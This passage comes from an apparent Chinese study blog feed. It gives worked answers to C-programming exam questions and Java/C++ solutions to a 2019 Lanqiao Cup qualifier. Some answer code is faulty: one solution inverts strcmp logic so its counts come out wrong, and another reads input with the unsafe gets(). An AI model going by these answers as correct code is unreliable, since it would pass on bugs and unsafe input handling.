(str[i] != '\0') &#123; if (str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') count[str[i] - 'a']++; else if (str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') count[str[i] - 'A']++; i++; &#125; printf("统计结果为：\n"); for (i = 0;i &lt; 26;i++) &#123; if (count[i] != 0) &#123; printf("%c - %d\n",i + 'A',count[i]); &#125; &#125; return 0;&#125; 答案： 功能：输入一行字符串，不区分大小写字母，统计所有字母出现的次数，输出 输出结果： 12345678910111213统计结果为：A - 2E - 1G - 1H - 1I - 2K - 1M - 1O - 1P - 1R - 2S - 3T - 3 描述程序的主要功能，并写出程序的运行结果 123456789101112131415161718192021#include&lt;stdio.h&gt;int main()&#123; int max,min,i,j; struct student&#123; char name[10]; int score; &#125;; struct student stu[5] = &#123;"Liming",75,"Zhangling",89,"Wanghai",93,"Liuhong",62,"Zhaoqiang",85&#125;; max = min = 0; for (i = 0;i &lt; 5;i++) &#123; if (stu[i].score &gt; stu[max].score) max = i; else if (stu[i].score &lt; stu[min].score) min = i; &#125; printf("Max is:%s,%d\n",stu[max].name,stu[max].score); printf("Min is:%s,%d\n",stu[min].name,stu[min].score); return 0; &#125; 答案： 功能：找出5个数组元素中成绩值最大的和成绩值最小的学生，并将她们的全部信息输出 输出结果： 12Max is:Wanghai,93Min is:Liuhong,62 程序运行时，若输入以下数据:12345描述程序的主要功能，并写出程序的运行结果 1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; unsigned int number; int d; printf("请输入一个正整数:"); scanf("%d",&amp;number); printf("result:"); do&#123; d = number % 10; printf("%d",d); number = number / 10; &#125;while(number != 0); return 0;&#125; 答案： 功能：输入一个正整数，将它倒序输出 输出结果：54321 程序设计题 编写程序，实现下列格式的乘法口诀表 1234567891*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81 答案： 1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int i,j; for (i = 1;i &lt; 10;i++) &#123; for (j = 1;j &lt;= i;j++) &#123; printf("%d*%d=%d\t",i,j,i * j); &#125; printf("\n"); &#125; return 0;&#125; 从键盘输入100个人的姓名、性别和年龄，分别统计0-29岁、30-59岁、60以上的男、女人数答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 100#define Nan "男" #define Nv "女"struct people&#123; char name[20]; char sex[2]; int age;&#125; ps[N];int main()&#123; int i; int age0[2] = &#123;0&#125;; int age30[2] = &#123;0&#125;; int age60[2] = &#123;0&#125;; for (i = 0;i &lt; N;i++) &#123; printf("请输入第%d个人的信息：\n",i + 1); printf("请输入Ta的姓名（不超过10个汉字）："); scanf("%s",ps[i].name); getchar(); printf("请输入Ta的性别（男或者女）："); scanf("%s",ps[i].sex); printf("请输入Ta的年龄（整数）："); scanf("%d",&amp;ps[i].age); getchar(); &#125; for (i = 0;i &lt; N;i++) &#123; if (ps[i].age &gt;= 0 &amp;&amp; ps[i].age &lt; 30) &#123; if (strcmp(Nan,ps[i].sex)) &#123; age0[0]++; &#125; if (strcmp(Nv,ps[i].sex)) &#123; age0[1]++; &#125; &#125; if (ps[i].age &gt;= 30 &amp;&amp; ps[i].age &lt; 60) &#123; if (strcmp(Nan,ps[i].sex)) &#123; age30[0]++; &#125; if (strcmp(Nv,ps[i].sex)) &#123; age30[1]++; &#125; &#125; if (ps[i].age &gt;= 60) &#123; if (strcmp(Nan,ps[i].sex)) &#123; age60[0]++; &#125; if (strcmp(Nv,ps[i].sex)) &#123; age60[1]++; &#125; &#125; &#125; printf("统计结果：\n"); printf("0 ~ 29岁性别为男的人数为%d，0 ~ 29岁性别为女的人数为%d\n",age0[0],age0[1]); printf("30 ~ 59岁性别为男的人数为%d，30 ~ 59岁性别为女的人数为%d\n",age30[0],age30[1]); printf("60岁以上性别为男的人数为%d，60岁以上性别为女的人数为%d\n",age60[0],age60[1]); return 0;&#125; 从键盘上输入字符串1，将字符串I中除去数字字符’0’ ~ ‘9’之后的其它字符保留在字符串2中，开输出字符串2答案： 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#define N 100int main()&#123; int i = 0,j = 0; char str1[N]; char str2[N]; printf("请输入字符串（长度不超过%d个）",N); gets(str1); while (str1[i] != '\0') &#123; if (str1[i] &gt;= '0' &amp;&amp; str1[i] &lt;= '9') &#123; i++; continue; &#125; str2[j++] = str1[i]; i++; &#125; str2[j] = '\0'; printf("结果为：\n"); printf("%s\n",str2); return 0;&#125;]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>807</tag>
        <tag>程序综合设计</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年第十一届蓝桥杯校内选拔赛JavaB组题解]]></title>
    <url>%2Fposts%2F4a4a9225%2F</url>
    <content type="text"><![CDATA[一共十个题，都比较好做 题目1 问题描述 在计算机存储中，15.125GB是多少MB？ 答案：15488思路：1GB=1024MB解题代码： java: 1234567891011package wiki.zimo.exam2019;/*** * @author zimo**/public class Demo01 &#123; public static void main(String[] args) &#123; System.out.println(15.125 * 1024); &#125;&#125; c++: 12345678#include &lt;iostream&gt;using namespace std;int main() &#123; cout &lt;&lt; 15.125 * 1024 &lt;&lt; endl; return 0;&#125; 题目2 问题描述 不超过19000的正整数中，与19000互质的数的个数是多少？ 答案：7200思路：两个数互质，那么它们的最大公约数是1解题代码： java: 12345678910111213141516171819202122232425package wiki.zimo.exam2019;/*** * @author zimo**/public class Demo02 &#123; public static void main(String[] args) &#123; int ans = 0; for (int i = 1;i &lt;= 19000;i++) &#123; if (gcd(i,19000) == 1) &#123; ans++; &#125; &#125; System.out.println(ans); &#125; private static int gcd(int a, int b) &#123; if (b == 0) &#123; return a; &#125; else &#123; return gcd(b,a % b); &#125; &#125;&#125; c++: 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int gcd(int a, int b) &#123; if (b == 0) &#123; return a; &#125; else &#123; return gcd(b, a % b); &#125;&#125;int main() &#123; int ans = 0; for (int i = 1; i &lt;= 19000; i++) &#123; if (gcd(i, 19000) == 1) &#123; ans++; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目3 问题描述 一个包含有2019个结点的二叉树，最少有多少层？ 注意当一棵二叉树只有一个结点时为一层。 答案：11思路：满二叉树层数最少，而满二叉树第一层节点数是1，第二层节点数是2，第三层节点数是4，，，以此类推，第n层节点数是2的n-1次方，于是这题目就变成了1+2+4+…+2n-1&gt;2019解题代码： java: 123456789101112131415161718192021package wiki.zimo.exam2019;/*** * @author zimo**/public class Demo03 &#123; public static void main(String[] args) &#123; int a = 0; int d = 1;; for (int i = 0;i &lt; Integer.MAX_VALUE;i++) &#123; a += Math.pow(2, i); System.out.println(d + "," + a); if (a &gt;= 2019) &#123; break; &#125; d++; &#125; System.out.println(d); &#125;&#125; c++: 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main() &#123; int a = 0; int d = 1;; for (int i = 0; i &lt; INT_MAX; i++) &#123; a += pow(2, i);// cout &lt;&lt; d &lt;&lt; "," &lt;&lt; a &lt;&lt; endl; if (a &gt;= 2019) &#123; break; &#125; d++; &#125; cout &lt;&lt; d &lt;&lt; endl; return 0;&#125; 题目4 问题描述 由1对括号，可以组成一种合法括号序列：()。 由2对括号，可以组成两种合法括号序列：()()、(())。 由4对括号组成的合法括号序列一共有多少种？ 答案：14思路：对四对括号，先用回溯法全排列，然后set暴力去重，最后用stack验证是否合法代码： java: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package wiki.zimo.exam2019;import java.util.HashSet;import java.util.Stack;/*** * @author zimo**/public class Demo04 &#123; static HashSet&lt;String&gt; set = new HashSet&lt;String&gt;(); public static void main(String[] args) &#123; String s = "(((())))"; // 回溯法全排列，set暴力去重，stack验证是否合法 dfs(s.toCharArray(),0); int ans = 0; for (String str : set) &#123; if (judge(str)) &#123; ans++; System.out.println(str); &#125; &#125; System.out.println(ans); &#125; private static boolean judge(String str) &#123; Stack&lt;Character&gt; stack = new Stack&lt;&gt;(); for (int i = 0;i &lt; str.length();i++) &#123; char c = str.charAt(i); if (c == '(') &#123; stack.push(c); &#125; if (c == ')') &#123; if (stack.isEmpty()) &#123; return false; &#125; stack.pop(); &#125; &#125; return stack.isEmpty(); &#125; private static void dfs(char[] a, int b) &#123; if (b &gt;= a.length) &#123; String s = new String(a); set.add(s); &#125; for (int i = b;i &lt; a.length;i++) &#123; &#123;char t = a[i];a[i] = a[b];a[b] = t;&#125; dfs(a, b + 1); &#123;char t = a[i];a[i] = a[b];a[b] = t;&#125; &#125; &#125;&#125; c++: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include &lt;set&gt;using namespace std;set&lt;string&gt; se;void dfs(string a, int b, int n) &#123; if (b &gt;= n) &#123; se.insert(a); &#125; for (int i = b; i &lt; n; i++) &#123; &#123; char t = a[i]; a[i] = a[b]; a[b] = t; &#125; dfs(a, b + 1, n); &#123; char t = a[i]; a[i] = a[b]; a[b] = t; &#125; &#125;&#125;bool judge(string str, int n) &#123; int left = 0; for (int i = 0; i &lt; str.length(); i++) &#123; char c = str[i]; if (c == '(') &#123; left++; &#125; if (c == ')') &#123; if (left == 0) &#123; return false; &#125; left--; &#125; &#125; return left == 0;&#125;int main() &#123; string s = "(((())))"; dfs(s, 0, s.length()); int ans = 0; set&lt;string&gt;::iterator it; for (it = se.begin(); it != se.end(); it++) &#123; if (judge(*it, s.length())) &#123; cout &lt;&lt; *it &lt;&lt; endl; ans++; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目5 问题描述 在数列 a[1], a[2], …, a[n] 中，如果对于下标 i, j, k 满足 0&lt;i&lt;j&lt;k&lt;n+1 且 a[i]&lt;a[j]&lt;a[k]，则称 a[i], a[j], a[k] 为一组递增三元组，a[j]为递增三元组的中心。 给定一个数列，请问数列中有多少个元素可能是递增三元组的中心。 输入格式 输入的第一行包含一个整数 n。 第二行包含 n 个整数 a[1], a[2], …, a[n]，相邻的整数间用空格分隔，表示给定的数列。 输出格式 输出一行包含一个整数，表示答案。 样例输入 5 1 2 5 3 5 样例输出 2 样例说明 a[2] 和 a[4] 可能是三元组的中心。 思路：暴力计数解题代码： java: 1234567891011121314151617181920212223242526272829303132package wiki.zimo.exam2019;import java.util.Scanner;/*** * @author zimo**/public class Demo05 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int a[] = new int[n]; for (int i = 0;i &lt; n;i++) &#123; a[i] = input.nextInt(); &#125; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; l:for (int j = i + 1;j &lt; n ;j++) &#123; for (int k = j + 1;k &lt; n;k++) &#123; if (a[i] &lt; a[j] &amp;&amp; a[j] &lt; a[k]) &#123; ans++; break l; &#125; &#125; &#125; &#125; System.out.println(ans); &#125;&#125; c++: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int main() &#123; int n = 0; cin &gt;&gt; n; int a[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; bool flag = false; for (int k = j + 1; k &lt; n; k++) &#123; if (a[i] &lt; a[j] &amp;&amp; a[j] &lt; a[k]) &#123; ans++; flag = true; break; &#125; &#125; if (flag)&#123; break; &#125; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目6 问题描述 在数列 a_1, a_2, …, a_n中，如果 a_i 和 a_j 满足 i &lt; j 且 a_i &gt; a_j，则称为一个逆序数对。 给定一个数列，请问数列中总共有多少个逆序数对。 输入格式 输入的第一行包含一个整数 n。 第二行包含 n 个整数 a_1, a_2, …, a_n，相邻的整数间用空格分隔，表示给定的数列。 输出格式 输出一行包含一个整数，表示答案。 样例输入 6 3 1 5 2 3 5 样例输出 4 思路：暴力计数解题代码： java: 123456789101112131415161718192021222324252627282930package wiki.zimo.exam2019;import java.util.Scanner;/*** * @author zimo**/public class Demo06 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int a[] = new int[n]; for (int i = 0;i &lt; n;i++) &#123; a[i] = input.nextInt(); &#125; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; for (int j = i + 1;j &lt; n;j++) &#123; if (a[i] &gt; a[j]) &#123; ans++; &#125; &#125; &#125; System.out.println(ans); &#125;&#125; c++: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;int main() &#123; int n = 0; cin &gt;&gt; n; int a[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if (a[i] &gt; a[j]) &#123; ans++; &#125; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目7 问题描述 在数列 a_1, a_2, …, a_n中，定义两个元素 a_i 和 a_j 的距离为 |i-j|+|a_i-a_j|，即元素下标的距离加上元素值的差的绝对值，其中 |x| 表示 x 的绝对值。 给定一个数列，请问找出元素之间最大的元素距离。 输入格式 输入的第一行包含一个整数 n。 第二行包含 n 个整数 a_1, a_2, …, a_n，相邻的整数间用空格分隔，表示给定的数列。 输出格式 输出一行包含一个整数，表示答案。 样例输入 5 9 4 2 4 7 样例输出 9 样例说明 a_1 和 a_3 的距离为 |1-3|+|9-2|=9。 思路：暴力解题代码： java: 1234567891011121314151617181920212223242526272829package wiki.zimo.exam2019;import java.util.Scanner;/*** * @author zimo**/public class Demo07 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int a[] = new int[n]; for (int i = 0;i &lt; n;i++) &#123; a[i] = input.nextInt(); &#125; int ans = 0; for (int i = 0;i &lt; n;i++) &#123; for (int j = i + 1;j &lt; n;j++) &#123; int dis = Math.abs(i - j) + Math.abs(a[i] - a[j]); ans = Math.max(dis, ans); &#125; &#125; System.out.println(ans); &#125;&#125; c++: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main() &#123; int n = 0; cin &gt;&gt; n; int a[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; &#125; int ans = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; int dis = abs(i - j) + abs(a[i] - a[j]); ans = max(dis, ans); &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0;&#125; 题目8 问题描述 小明有一块空地，他将这块空地划分为 n 行 m 列的小块，每行和每列的长度都为 1。 小明选了其中的一些小块空地，种上了草，其他小块仍然保持是空地。 这些草长得很快，每个月，草都会向外长出一些，如果一个小块种了草，则它将向自己的上、下、左、右四小块空地扩展，这四小块空地都将变为有草的小块。 请告诉小明，k 个月后空地上哪些地方有草。 输入格式 输入的第一行包含两个整数 n, m。 接下来 n 行，每行包含 m 个字母，表示初始的空地状态，字母之间没有空格。如果为小数点，表示为空地，如果字母为 g，表示种了草。 接下来包含一个整数 k。 输出格式 输出 n 行，每行包含 m 个字母，表示 k 个月后空地的状态。如果为小数点，表示为空地，如果字母为 g，表示长了草。 样例输入 4 5 .g… ….. ..g.. ….. 2 样例输出 gggg. gggg. ggggg .ggg. 思路：按时刻更新空地即可解题代码： java: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package wiki.zimo.exam2019;import java.util.ArrayList;import java.util.List;import java.util.Scanner;/*** * @author zimo**/public class Demo08 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); int m = input.nextInt(); // 干掉回车符 input.nextLine(); char map[][] = new char[n][m]; for (int i = 0;i &lt; n;i++) &#123; map[i] = input.nextLine().toCharArray(); &#125; int k = input.nextInt(); for (int i = 0;i &lt; k;i++) &#123; List&lt;Integer&gt; xs = new ArrayList&lt;Integer&gt;(); List&lt;Integer&gt; ys = new ArrayList&lt;Integer&gt;(); for (int x = 0;x &lt; n;x++) &#123; for (int y = 0;y &lt; m;y++) &#123; if (map[x][y] == 'g') &#123; xs.add(x); ys.add(y); &#125; &#125; &#125; for (int j = 0;j &lt; xs.size();j++) &#123; dfs(map, xs.get(j), ys.get(j)); &#125; xs.clear(); ys.clear(); &#125; print(map, n, m); &#125; private static void print(char map[][],int n,int m) &#123; for (int i = 0;i &lt; n;i++) &#123; for (int j = 0;j &lt; m;j++) &#123; System.out.print(map[i][j]); &#125; System.out.println(); &#125; System.out.println(); &#125; private static void dfs(char[][] map,int x,int y) &#123; if (x - 1 &gt;= 0 &amp;&amp; map[x - 1][y] == '.') &#123; map[x - 1][y] = 'g'; &#125; if (x + 1 &lt; map.length &amp;&amp; map[x + 1][y] == '.') &#123; map[x + 1][y] = 'g'; &#125; if (y - 1 &gt;= 0 &amp;&amp; map[x][y - 1] == '.') &#123; map[x][y - 1] = 'g'; &#125; if (y + 1 &lt; map[x].length &amp;&amp; map[x][y + 1] == '.') &#123; map[x][y + 1] = 'g'; &#125; &#125;&#125; c++: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;#define N 100#define M 100int n = 0, m = 0;void dfs(char map[N][M], int x, int y) &#123; if (x - 1 &gt;= 0 &amp;&amp; map[x - 1][y] == '.') &#123; map[x - 1][y] = 'g'; &#125; if (x + 1 &lt; n &amp;&amp; map[x + 1][y] == '.') &#123; map[x + 1][y] = 'g'; &#125; if (y - 1 &gt;= 0 &amp;&amp; map[x][y - 1] == '.') &#123; map[x][y - 1] = 'g'; &#125; if (y + 1 &lt; m &amp;&amp; map[x][y + 1] == '.') &#123; map[x][y + 1] = 'g'; &#125;&#125;void print(char map[N][M]) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; m; j++) &#123; cout &lt;&lt; map[i][j]; &#125; cout &lt;&lt; endl; &#125; cout &lt;&lt; endl;&#125;int main() &#123; int k = 0; cin &gt;&gt; n &gt;&gt; m; char map[N][M]; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; m; j++) &#123; cin &gt;&gt; map[i][j]; &#125; &#125; cin &gt;&gt; k; for (int i = 0; i &lt; k; i++) &#123; vector&lt;int&gt; xs; vector&lt;int&gt; ys; for (int x = 0; x &lt; n; x++) &#123; for (int y = 0; y &lt; m; y++) &#123; if (map[x][y] == 'g') &#123; xs.push_back(x); ys.push_back(y); &#125; &#125; &#125; for (int j = 0; j &lt; xs.size(); j++) &#123; dfs(map, xs[j], ys[j]); &#125; xs.clear(); ys.clear(); &#125; print(map); return 0;&#125; 题目9 问题描述 小明想知道，满足以下条件的正整数序列的数量： 1. 第一项为 n； 2. 第二项不超过 n； 3. 从第三项开始，每一项小于前两项的差的绝对值。 请计算，对于给定的 n，有多少种满足条件的序列。 输入格式 输入一行包含一个整数 n。 输出格式 输出一个整数，表示答案。答案可能很大，请输出答案除以10000的余数。 样例输入 4 样例输出 7 样例说明 以下是满足条件的序列： 4 1 4 1 1 4 1 2 4 2 4 2 1 4 3 4 4 思路：改版的斐波那契数列，经典的递归回溯问题，动态规划问题（博主能力有限，动态规划解法没做出来，回溯法可以得部分分）解题代码： java: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package wiki.zimo.exam2019;import java.util.*;/*** * @author zimo**/public class Demo09 &#123; static int ans = 0; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); if (n &lt;= 1) &#123; System.out.println(1); return; &#125; int a[] = new int[n]; a[0] = n; // 第一项是n for (int i = 1;i &lt;= n;i++) &#123; a[1] = i;// 第二项有n种 dfs(a,2);// 从第三项开始每一项都跟前两项有关 &#125; System.out.println(ans % 10000); &#125; private static void dfs(int a[],int n) &#123;// System.out.println(Arrays.toString(a)); print(a); ans++; int abs = Math.abs(a[n - 1] - a[n - 2]); for (int i = 1;i &lt; abs;i++) &#123; a[n] = i; dfs(a,n + 1); for (int j = n;j &lt; a.length;j++) &#123;// 后面置0，上一次递归可能改过第n项以后的值 a[j] = 0; &#125; &#125; &#125; private static void print(int a[]) &#123; for (int i = 0;i &lt; a.length;i++) &#123; if (a[i] != 0) &#123; System.out.print(a[i] + " "); &#125; &#125; System.out.println(); &#125;&#125; c++: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;int ans = 0;void print(int a[], int len) &#123; for (int i = 0; i &lt; len; i++) &#123; if (a[i] != 0) &#123; cout &lt;&lt; a[i] &lt;&lt; " "; &#125; &#125; cout &lt;&lt; endl;&#125;void dfs(int a[], int n, int len) &#123;// System.out.println(Arrays.toString(a)); print(a, len); ans++; int nabs = abs(a[n - 1] - a[n - 2]); for (int i = 1; i &lt; nabs; i++) &#123; a[n] = i; dfs(a, n + 1, len); for (int j = n; j &lt; len; j++) &#123;// 后面置0，上一次递归可能改过第n项以后的值 a[j] = 0; &#125; &#125;&#125;int main() &#123; int n = 0; cin &gt;&gt; n; if (n &lt;= 1) &#123; cout &lt;&lt; 1 &lt;&lt; endl; return 0; &#125; int a[n]; memset(a, 0, sizeof(int) * n);// 数组初始化0 a[0] = n; // 第一项是n for (int i = 1; i &lt;= n; i++) &#123; a[1] = i;// 第二项有n种 dfs(a, 2, n);// 从第三项开始每一项都跟前两项有关 &#125; cout &lt;&lt; ans % 10000 &lt;&lt; endl; return 0;&#125; 题目10 这个题忘记复制题目了，这个题是贪心算法 解题代码： java: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package wiki.zimo.exam2019;import java.util.HashSet;import java.util.Scanner;/*** * @author zimo**/public class Demo10 &#123; public static void main(String[] args) &#123; Scanner input = new Scanner(System.in); int n = input.nextInt(); Tree ts[] = new Tree[n]; for (int i = 0;i &lt; n;i++) &#123; ts[i] = new Tree(); ts[i].x = input.nextInt(); ts[i].y = input.nextInt(); ts[i].r = input.nextInt(); &#125; int ans = 0; HashSet&lt;Tree&gt; set = new HashSet&lt;&gt;(); for (int i = 0;i &lt; n;i++) &#123; for (int j = i + 1;j &lt; n;j++) &#123; if (judge(ts[i],ts[j])) &#123; if (ts[i].r &gt; ts[j].r) &#123; set.add(ts[i]); &#125; else &#123; set.add(ts[j]); &#125; &#125; else &#123; set.add(ts[i]); set.add(ts[j]); &#125; &#125; &#125; for (Tree t : set) &#123; ans += t.r; &#125; System.out.println(ans); &#125; private static boolean judge(Tree t1, Tree t2) &#123; double x = t1.x - t2.x; double y = t1.y - t2.y; double dis = Math.sqrt(x * x + y * y); return dis &lt; t1.r + t2.r; &#125; static class Tree&#123; int x; int y; int r; @Override public int hashCode() &#123; final int prime = 31; int result = 1; result = prime * result + r; result = prime * result + x; result = prime * result + y; return result; &#125; @Override public boolean equals(Object obj) &#123; Tree other = (Tree) obj; if (r != other.r) return false; if (x != other.x) return false; if (y != other.y) return false; return true; &#125; @Override public String toString() &#123; return "Tree [x=" + x + ", y=" + y + ", r=" + r + "]"; &#125; &#125;&#125; c++: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;sstream&gt;#include &lt;cmath&gt;#include &lt;set&gt;using namespace std;class Tree &#123;public: int x; int y; int r; bool equals(Tree obj) &#123; Tree other = obj; if (r != other.r) return false; if (x != other.x) return false; if (y != other.y) return false; return true; &#125; string toString() &#123; stringstream s1; s1 &lt;&lt; "Tree [x=" &lt;&lt; x &lt;&lt; ", y=" &lt;&lt; y &lt;&lt; ", r=" &lt;&lt; r &lt;&lt; "]"; return s1.str(); &#125;&#125;;struct TreeFunctor &#123; bool operator()(const Tree &amp;left, const Tree &amp;right) &#123; return (left.x &lt; right.x); &#125;&#125;; bool judge(Tree t1, Tree t2) &#123; double x = t1.x - t2.x; double y = t1.y - t2.y; double dis = sqrt(x * x + y * y); return dis &lt; t1.r + t2.r; &#125; int main() &#123; int n = 0; cin &gt;&gt; n; Tree ts[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; ts[i].x &gt;&gt; ts[i].y &gt;&gt; ts[i].r; &#125; int ans = 0; set&lt;Tree,TreeFunctor&gt; se; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if (judge(ts[i], ts[j])) &#123; if (ts[i].r &gt; ts[j].r) &#123; se.insert(ts[i]); &#125; else &#123; se.insert(ts[j]); &#125; &#125; else &#123; se.insert(ts[i]); se.insert(ts[j]); &#125; &#125; &#125; set&lt;Tree,TreeFunctor&gt;::iterator it; for (it = se.begin(); it != se.end(); it++) &#123; ans += (*it).r; &#125; cout &lt;&lt; ans &lt;&lt; endl; return 0; &#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>算法</tag>
        <tag>蓝桥杯</tag>
        <tag>题解</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2017年真题答案以及解析]]></title>
    <url>%2Fposts%2F20a2677f%2F</url>
    <content type="text"><![CDATA[单项选择题 C语言程序基本结构单位是A.过程B.变量C.函数D.类答案：C解析：函数是C程序的基本组成单位 若用数组名作为函数调用时的实参，则实际上传递给形参的是A.数组首地址B.数组的任意一个元素值C.数组中全部元素的值D.数组元素的个数答案：A解析：数组名几乎在所有使用到情况下都是该数组的首地址 C语言中基本数据类型包括A.整型、实型、逻辑型、嵌套型.B.整型、字符型、逻辑型、自定义型C.整型、实型、逻辑型、字符型、智能型D.整型、实型、字符型答案：D解析：第很多次强调了，C语言基本数据类型两个空写整型和实型，三个空写整型、实型、字符型，其中实型也叫做浮点型 为表示关系x大于等于y，且y大于等于z，应使用C语言表达式A. (x&gt;=y)&amp;&amp;(y&gt;=z)B. (x&gt;=y)AND(y&gt;=z)C. (x&gt;=y&gt;=z)D. (x&gt;=y)&amp;(y&gt;=z)答案：A解析：B选项，C语言没有AND这个所谓的操作符；C选项，连用关系表达式将从左到右结合，结果是(x &gt;= y)结果是0（假）或者1（真），然后0或者1再和z比大小，结果同样是0或者1；D选项，先比较大小过后的结果做&amp;（按位与）运算 表示字符串结束的转义字符是A.’\a’B.’\t’C.’\n’D.’\0’答案：D解析：’\0’代表字符串结尾，其实这个值是0，另外还有一个0值也值得注意，那就是NULL，代表空指针，这个值同样是0，拓展，所有逻辑运算，如果为真值是1，如果为假，值是0 若一个单向链表中的结点含有两个域，其中data是指向字符串的指针，next是指向结点的指针域，则结点结构类型定义正确的是A. struct link { char *data; struct link *next;};B. struct link { char data; struct link *nex;};C. struct link { char *data;struct link next;};D. struct link { char data; struct link next;};答案：A解析：指向字符串的指针其实就是字符指针，所以使用char *变量标识符来定义，结构体变量应该使用struct 结构体名称 变量标识符定义，而指向结点类型的指针应该使用struct 结构体名称 *变量标识符定义，简记：struct 结构体名称，代表结构体类型，就像int 代表整型一样 下面哪个运算符不是关系运算符A. ==B. &gt;=C. =D. &lt;=答案：C解析：=在C语言中是赋值运算符 若有定义: int a=3;，执行语句a+=a-=aa;后，a的值为A. 3B. -12C. 5D. 4答案：B解析：把这个语句拆开，可以等价为`a=a - aa;a=a+a`;第一句执行完成之后a=-6，第二句执行完成之后a=-12 以下对数组x实行初始化的正确操作是A. int x[]={1,2,3,4};B. int x={1,2,3,4};C. int x[3]={1,2,3,4};D. int x[4]=1,2,3,4;答案：A解析：定义数组时，如果给了初始化列表，则可以不写数组的大小，编译器会自动计算数组的大小，并进行对应元素的赋值操作，所以A正确；B选项纯粹瞎写，定义的是整型变量，还给了一个初始化列表，不合法；C选项，如果给出了数组的大小，那么初始化列表中给出的数据项个数不能超过数组的大小，否则编译失败，但是可以小于数据的大小，并且同时不能小于1个，缺少的部分，编译器自动补0；D选项，给出的不是初始化列表； C语言规定，决定函数返回值类型的是A. return 语句中的表达式类型B. 调用该函数时的主调函数类型C. 调用该函数时的形参类型D. 在定义该函数时所指定的函数类型答案：D解析：函数三要素，函数名，参数，返回值类型；其中返回值类型决定函数的返回值类型； 判断题 一个C程序中，main函数的位置必须在源程序开始处答案：×解析：C程序中，main函数可以出现在任何位置，前提是不写在其他声明或者其他函数内部 可以在赋值语句中通过赋值运算符“=”对字符数组整体赋值。答案：×解析：在定义的时候初始化，就可以在赋值语句中利用”=”运算符直接对字符数组“整体”赋值，注意我打了引号，这里本质上其实是逐个赋值，只是编译器帮你做了优化，让你可以简化赋值的方式，而不需要写循环语句，整体赋值在任何情况下都是不允许的 在C语言中，数组元素的下标是从1开始的答案：×解析：纯属胡说八道，C语言中，数组元素的下标永远是从0开始的 在do-while (表达式)结构的循环中，当表达式的值为0时循环体至少执行一次答案：√解析：do-while循环一开始就会执行一次，然后才会判断表达式的值是否为0，为0就不执行了，为1继续执行循环体，所以do-while循环至少执行一次，这是与其他循环语句不同的地方 